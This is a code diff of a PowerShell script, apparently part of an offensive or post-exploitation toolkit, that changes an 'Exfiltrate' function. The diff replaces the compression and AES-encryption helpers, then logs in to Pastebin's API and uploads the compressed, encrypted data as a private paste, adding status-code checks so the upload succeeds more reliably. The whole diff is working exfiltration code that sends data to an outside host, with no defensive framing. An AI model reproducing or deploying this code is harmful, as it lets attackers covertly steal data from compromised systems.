@@ -1,83 +1,32 @@
 
-function Create-AesManagedObject($key, $IV) {
-    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
-    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
-    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
-    $aesManaged.BlockSize = 128
-    $aesManaged.KeySize = 256
-    if ($IV) {
-        if ($IV.getType().Name -eq "String") {
-            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
-        }
-        else {
-            $aesManaged.IV = $IV
-        }
+function Get-Compressed-String {
+
+	[CmdletBinding()]
+    Param (
+	[Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
+        [string] $text= $(Throw("-string is required"))
+    )
+	Process {
+        [System.Text.Encoding] $enc = [System.Text.Encoding]::UTF8
+        [byte[]] $byteArray = $enc.GetBytes( $text )
+
+       	[System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
+        $gzipStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
+      	$gzipStream.Write( $byteArray, 0, $byteArray.Length )
+        $gzipStream.Close()
+        $output.Close()
+
+        return $output.ToArray()
     }
-    if ($key) {
-        if ($key.getType().Name -eq "String") {
-            $aesManaged.Key = [System.Convert]::FromBase64String($key)
-        }
-        else {
-            $aesManaged.Key = $key
-        }
-    }
-    $aesManaged
 }
 
-function Encrypt-String($key, $unencryptedString,$base64) {
-    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
+function Encrypt-Bytes($key, $bytes) {
     $aesManaged = Create-AesManagedObject $key
     $encryptor = $aesManaged.CreateEncryptor()
     $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
     [byte[]] $fullData = $aesManaged.IV + $encryptedData
     $aesManaged.Dispose()
-
-    if ($base64 -eq $true){
-        return [System.Convert]::ToBase64String($fullData)
-    }
-    else{
-        return $fullData
-    }
-}
-
-function Encrypt-Bytes($key, $bytes,$base64) {
-    $aesManaged = Create-AesManagedObject $key
-    $encryptor = $aesManaged.CreateEncryptor()
-    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
-    [byte[]] $fullData = $aesManaged.IV + $encryptedData
-    $aesManaged.Dispose()
-
-    if ($base64 -eq $true){
-        return [System.Convert]::ToBase64String($fullData)
-    }
-    else{
-        return $fullData
-    }
-}
-
-
-function Compress-Encode($bytestream) {
-    #Compression logic from http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
-    $ms = New-Object IO.MemoryStream
-    $action = [IO.Compression.CompressionMode]::Compress
-    $cs = New-Object IO.Compression.DeflateStream ($ms, $action)
-    $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
-    $bytestream | ForEach-Object { $sw.WriteLine($_) }
-    $sw.Close()
-    # Base64 encode stream
-    $code = [Convert]::ToBase64String($ms.ToArray())
-    return $code
-}
-
-function Compress($bytestream) {
-    #Compression logic from http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
-    $ms = New-Object IO.MemoryStream
-    $action = [IO.Compression.CompressionMode]::Compress
-    $cs = New-Object IO.Compression.DeflateStream ($ms, $action)
-    $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
-    $bytestream | ForEach-Object { $sw.WriteLine($_) }
-    $sw.Close()
-    return $ms.ToArray()
+    [System.Convert]::ToBase64String($fullData)
 }
 
 function Exfiltrate {
@@ -125,36 +74,43 @@ function Exfiltrate {
         $http_request.setRequestHeader("Connection", "close") 
         $http_request.send($parameters) 
 
-        return $http_request.responseText 
+        return $http_request.responseText,$http_request.status
     } 
-
-    function Encrypt-JSON {
-
-        Param( 
-            [Parameter( Mandatory = $true, Position = 0)] 
-            [string]$KeyAES,
-            [Parameter( Mandatory = $true, Position = 0)] 
-            [string]$Payload
-        ) 
-        
-        $SecuredPayload  = Encrypt-Bytes $KeyAES $Payload $True
-
-        return $SecuredPayload 
-
-    }
 
     if ($exfiloption -eq "pastebin") {
 
-        #$encrypted = Encrypt-JSON -KeyAES $Key -Payload $Data
-        $compressed = Compress $Data
-        Write-Host "Compression completed size $($compressed.length)"
-        $encrypted = Encrypt-Bytes $Key $compressed $True
         
-        Write-Host "Encrypted completed size $($encrypted.length)"
-        $script:session_key = post_http "https://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password" 
-        $ok = post_http "https://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$ID&api_paste_code=$compressed&api_paste_private=2" 
+        $session_key,$code = post_http "https://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password" 
+        $http_oky_codes = 200,201,202
 
-        return $compressed,$ok
+        if ($http_oky_codes.Contains($code))
+        {
+            if ($session_key -like '*Bad*')
+            {
+                Write-Debug "Session key $($session_key)"
+                return $code
+            }
+            else{
+                $compressed = Get-Compressed-String $Data
+                Write-Debug "Compressed completed size $($compressed.length)"
+                $encrypted = Encrypt-Bytes $Key $compressed
+                Write-Debug "Encrypted completed size $($encrypted.length)"
+    
+                Write-Host $encrypted
+                $link,$code = post_http "https://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$ID&api_paste_code=$encrypted&api_paste_private=2" 
+                
+                if ($http_oky_codes.Contains($code))
+                {
+                    return $link
+                }
+                else{
+                    return $code
+                }
+            }
+        }
+        else{
+            return $code
+        }
     }
 
 
